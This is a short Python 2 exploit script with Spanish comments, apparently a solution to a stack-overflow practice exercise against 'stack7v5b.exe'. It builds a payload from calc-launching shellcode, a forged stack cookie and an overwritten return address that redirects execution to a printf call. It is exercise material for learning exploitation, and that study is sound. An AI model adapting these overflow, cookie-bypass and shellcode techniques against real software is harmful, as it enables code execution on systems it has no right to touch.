import struct
import subprocess

argv0 = "A"
argv1 = "I"

shellcode = "\xeB\x02\xBA\xC7\x93\xBF\x77\xFF\xD2\xCC\xE8\xF3\xFF\xFF\xFF\x63\x61\x6C\x63" #19 bytes calc
buf = "\x49" * 30 + shellcode #49 bytes de basura
var_8 = struct.pack("<I", 0x10101010) #Redirijo eax hacia 0x10101010 que se encuentra en el address space y contiene "\x55\x8b" ebp
var_4 = "YouW"
s = "inCC"
r= "DDDD" # => edx (se suma 1 y se coloca en edx)
arg_0 = struct.pack("<I", 0x71885A53) # Cookie2
arg_4 = "GGGG" # junk

#Hay badchars en todas las direcciones del stack, no creo poder sacar calc
#Intento sacar un mensaje custom, salto a printf %s (no tiene mucho sentido saltar a printf %p)
eip = struct.pack("<I", 0x1010114B) # => salta al call printf
#Como seteo el mensaje?
#Se le envia como parametro de printf la direccion de Dest del buffer (NOTA: igual que un ret2libc)
p_arg1 = struct.pack("<I", 0x10103056)
payload = argv1+buf+var_8+var_4+s+r+arg_0+arg_4+eip+p_arg1

print "[#] Sending Payload"
subprocess.call(["stack7v5b.exe", argv0, payload])